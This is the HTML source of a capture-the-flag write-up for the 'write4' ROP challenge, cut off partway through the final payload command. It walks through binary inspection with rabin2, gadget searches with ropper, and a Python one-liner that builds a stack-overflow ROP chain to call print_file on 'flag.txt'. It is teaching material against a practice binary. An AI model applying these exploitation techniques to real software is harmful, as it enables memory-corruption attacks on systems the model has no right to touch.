&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rabin2 &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; write4
&lt;span class=&quot;nb&quot;&gt;arch     &lt;/span&gt;x86
baddr    0x400000
binsz    6521
bintype  elf
bits     64
canary   &lt;span class=&quot;nb&quot;&gt;false
&lt;/span&gt;class    ELF64
compiler GCC: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 7.5.0-3ubuntu1~18.04&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 7.5.0
crypto   &lt;span class=&quot;nb&quot;&gt;false
&lt;/span&gt;endian   little
havecode &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;lsyms    &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;os       linux
pcalign  0
pic      &lt;span class=&quot;nb&quot;&gt;false
&lt;/span&gt;relocs   &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;relro    partial
rpath    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
sanitiz  &lt;span class=&quot;nb&quot;&gt;false
&lt;/span&gt;static   &lt;span class=&quot;nb&quot;&gt;false
&lt;/span&gt;stripped &lt;span class=&quot;nb&quot;&gt;false
&lt;/span&gt;subsys   linux
va       &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file(char *filename)&lt;/code&gt; function, as we can see using rabin2, has a PLT entry that is located at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00400510&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rabin2 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; write4
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Imports]
nth vaddr      &lt;span class=&quot;nb&quot;&gt;bind   type   &lt;/span&gt;name
―――――――――――――――――――――――――――――――――
1   0x00400500 GLOBAL FUNC   pwnme
2   0x00000000 GLOBAL FUNC   __libc_start_main
3   0x00000000 WEAK   NOTYPE __gmon_start__
4   0x00400510 GLOBAL FUNC   print_file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This means that we have two steps that we need to accomplish:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Load a pointer to the string “flag.txt” into RDI (in x86-64, RDI contains the first argument to a function).&lt;/li&gt;
  &lt;li&gt;Overwrite the return address with &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00400510&lt;/code&gt; to call &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file(&quot;flag.txt&quot;)&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Unfortunately, there are no useful strings in the binary. This means that we need to somehow inject the “flag.txt” string into the process.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rabin2 &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; write4
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Strings]
nth paddr      vaddr      len size section &lt;span class=&quot;nb&quot;&gt;type  &lt;/span&gt;string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000006b4 0x004006b4 11  12   .rodata ascii nonexistent
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;writing-the-string&quot;&gt;Writing the String&lt;/h3&gt;

&lt;p&gt;Using rabin2, we can see that there are several writable sections in the binary. We can write our “flag.txt” string in the &lt;code class=&quot;highlighter-rouge&quot;&gt;.data&lt;/code&gt; section, which is writable and is located at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00601028&lt;/code&gt;. Theoretically, the &lt;code class=&quot;highlighter-rouge&quot;&gt;.bss&lt;/code&gt; section should also work just fine.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rabin2 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; write4
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; 
1   0x00000238   0x1c 0x00400238   0x1c &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .interp
2   0x00000254   0x20 0x00400254   0x20 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .note.ABI_tag
3   0x00000274   0x24 0x00400274   0x24 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .note.gnu.build_id
4   0x00000298   0x38 0x00400298   0x38 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .dynsym
6   0x000003c0   0x7c 0x004003c0   0x7c &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .dynstr
7   0x0000043c   0x14 0x0040043c   0x14 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .gnu.version
8   0x00000450   0x20 0x00400450   0x20 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .gnu.version_r
9   0x00000470   0x30 0x00400470   0x30 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .rela.dyn
10  0x000004a0   0x30 0x004004a0   0x30 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .rela.plt
11  0x000004d0   0x17 0x004004d0   0x17 &lt;span class=&quot;nt&quot;&gt;-r-x&lt;/span&gt; .init
12  0x000004f0   0x30 0x004004f0   0x30 &lt;span class=&quot;nt&quot;&gt;-r-x&lt;/span&gt; .plt
13  0x00000520  0x182 0x00400520  0x182 &lt;span class=&quot;nt&quot;&gt;-r-x&lt;/span&gt; .text
14  0x000006a4    0x9 0x004006a4    0x9 &lt;span class=&quot;nt&quot;&gt;-r-x&lt;/span&gt; .fini
15  0x000006b0   0x10 0x004006b0   0x10 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .rodata
16  0x000006c0   0x44 0x004006c0   0x44 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .eh_frame_hdr
17  0x00000708  0x120 0x00400708  0x120 &lt;span class=&quot;nt&quot;&gt;-r--&lt;/span&gt; .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 &lt;span class=&quot;nt&quot;&gt;-rw-&lt;/span&gt; .init_array
19  0x00000df8    0x8 0x00600df8    0x8 &lt;span class=&quot;nt&quot;&gt;-rw-&lt;/span&gt; .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 &lt;span class=&quot;nt&quot;&gt;-rw-&lt;/span&gt; .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 &lt;span class=&quot;nt&quot;&gt;-rw-&lt;/span&gt; .got
22  0x00001000   0x28 0x00601000   0x28 &lt;span class=&quot;nt&quot;&gt;-rw-&lt;/span&gt; .got.plt
23  0x00001028   0x10 0x00601028   0x10 &lt;span class=&quot;nt&quot;&gt;-rw-&lt;/span&gt; .data
24  0x00001038    0x0 0x00601038    0x8 &lt;span class=&quot;nt&quot;&gt;-rw-&lt;/span&gt; .bss
25  0x00001038   0x29 0x00000000   0x29 &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; .comment
26  0x00001068  0x618 0x00000000  0x618 &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; .symtab
27  0x00001680  0x1f6 0x00000000  0x1f6 &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; .strtab
28  0x00001876  0x103 0x00000000  0x103 &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; .shstrtab
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We need to figure out what “flag.txt” looks like in hexadecimal.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python
Python 3.8.5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default, Jul 28 2020, 12:59:40&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;GCC 9.3.0] on linux
Type &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;copyright&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;credits&quot;&lt;/span&gt; or &lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; a &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;flag.txt&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; a.encode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.hex&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;'666c61672e747874'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we know that we need to write the bytes &lt;code class=&quot;highlighter-rouge&quot;&gt;0x66 0x6c 0x61 0x67 0x2e 0x74 0x78 0x74&lt;/code&gt; at memory location &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00601028&lt;/code&gt;, so how do we actually accomplish this? The first step would be to search for some code in the binary that is in the form &lt;code class=&quot;highlighter-rouge&quot;&gt;mov [%], %; ret&lt;/code&gt;. If we could find code that does this, then we could write the hex bytes for “flag.txt” at memory location &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00601028&lt;/code&gt; by modifying the registers accordingly and jumping to that line of code.&lt;/p&gt;

&lt;p&gt;We can find a line of code in this form by using a tool called ropper. Ropper allows us to easily find ROP gadgets in binaries that we can use.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropper &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; write4 &lt;span class=&quot;nt&quot;&gt;--search&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;mov [%], %; ret&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Load gadgets from cache
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] loading... 100%
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] removing double gadgets... 100%
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;gadgets: mov &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;%], %&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] File: write4
0x00000000004005e2: mov byte ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rip + 0x200a4f], 1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop rbp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
0x0000000000400606: mov dword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp + 0x48], edx&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; mov ebp, esp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; call 0x500&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; mov eax, 0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop rbp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
0x0000000000400629: mov dword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rsi], edi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
0x0000000000400628: mov qword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;r14], r15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;mov qword ptr [r14], r15; ret&lt;/code&gt; at line &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400628&lt;/code&gt; seems perfect for us! Now, we just need to find a way to modify the registers so that &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt; is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00601028&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt; is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x666c61672e747874&lt;/code&gt;. We could do this by searching for a &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r14&lt;/code&gt; instruction and a &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r15&lt;/code&gt; instruction.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropper &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; write4 &lt;span class=&quot;nt&quot;&gt;--search&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;pop r14%; ret&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Load gadgets from cache
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] loading... 100%
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] removing double gadgets... 100%
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;gadgets: pop r14%&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] File: write4
0x0000000000400690: pop r14&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop r15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Luckily for us, in this scenario the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r14&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r15&lt;/code&gt; instructions were right next to each other. This means that we can put both of their values on the stack without needing another ROP gadget.&lt;/p&gt;

&lt;p&gt;So far, our stack buffer overflow should look like this:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;“A” written 40 times.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400690&lt;/code&gt;, which will make the program jump to the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r14; pop r15; ret&lt;/code&gt; instructions.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000601028&lt;/code&gt;, which will set &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt; to the memory location where we are writing our string.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x666c61672e747874&lt;/code&gt;, which will set &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt; to “flag.txt” written in ASCII.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400628&lt;/code&gt;, which will jump to the &lt;code class=&quot;highlighter-rouge&quot;&gt;mov qword ptr [r14], r15; ret;&lt;/code&gt; instruction after we have set &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This gives us the following input (which won’t work yet).&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;import sys; sys.stdout.buffer.write(b'A'*40 + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\x06\x40\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x28\x10\x60\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x66\x6c\x61\x67\x2e\x74\x78\x74&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x28\x06\x40\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;')&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;./&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write4&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In case you still don’t understand this ROP chain, here is what is actually going on:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Because of the buffer overflow, RIP is overwritten with &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400690&lt;/code&gt;, which is the location of the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r14; pop r15; ret&lt;/code&gt; ROP gadget.&lt;/li&gt;
  &lt;li&gt;When &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r14&lt;/code&gt; is executed, we will get &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000601028&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;When &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r15&lt;/code&gt; is executed, we will get &lt;code class=&quot;highlighter-rouge&quot;&gt;0x666c61672e747874&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;After that, &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400628&lt;/code&gt; is on the stack, which means that the &lt;code class=&quot;highlighter-rouge&quot;&gt;RET&lt;/code&gt; instruction will jump to that location.&lt;/li&gt;
  &lt;li&gt;The next ROP gadget that we execute contains &lt;code class=&quot;highlighter-rouge&quot;&gt;mov qword ptr [r14], r15;&lt;/code&gt;, which moves our copies our string into the location that &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt; points to.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;We still need to do the following for the exploit to work:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Set &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00601028&lt;/code&gt; (recall that the first parameter to a function is in &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; for x86-64 binaries)&lt;/li&gt;
  &lt;li&gt;Jump to &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file()&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;calling-the-function&quot;&gt;Calling the Function&lt;/h3&gt;

&lt;p&gt;Using ropper, we can find a way for us to modify &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; the same way we modified &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropper &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; write4 &lt;span class=&quot;nt&quot;&gt;--search&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;pop rdi; ret&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Load gadgets from cache
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] loading... 100%
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;LOAD] removing double gadgets... 100%
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;gadgets: pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] File: write4
0x0000000000400693: pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we jump to this ROP gadget and add &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000601028&lt;/code&gt; onto the stack, then when the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt; instruction is executed, we will have &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; point to the location of our string. From there, we can add &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400510&lt;/code&gt; to the stack, which is the location of the PLT entry for &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file(char *filename)&lt;/code&gt;. When the &lt;code class=&quot;highlighter-rouge&quot;&gt;RET&lt;/code&gt; instruction is executed, we will call &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file(&quot;flag.txt&quot;)&lt;/code&gt;, which will solve the problem!&lt;/p&gt;

&lt;p&gt;Our stack should now look like the following:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;“A” written 40 times.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400690&lt;/code&gt;, which will make the program jump to the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop r14; pop r15; ret&lt;/code&gt; instructions.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000601028&lt;/code&gt;, which will set &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt; to the memory location where we are writing our string.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x666c61672e747874&lt;/code&gt;, which will set &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt; to “flag.txt” written in ASCII.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400628&lt;/code&gt;, which will jump to the &lt;code class=&quot;highlighter-rouge&quot;&gt;mov qword ptr [r14], r15; ret;&lt;/code&gt; instruction after we have set &lt;code class=&quot;highlighter-rouge&quot;&gt;r14&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;r15&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400693&lt;/code&gt;, which will jump to the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop rdi; ret&lt;/code&gt; instruction.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000601028&lt;/code&gt;, which will set &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; to the memory location where we wrote our string.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0000000000400510&lt;/code&gt;, which will execute &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file(&quot;flag.txt&quot;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This gives us the following:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import sys; sys.stdout.buffer.write(b'A'*40 + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;90&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;67&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;78&lt;/span&gt;&lt;span 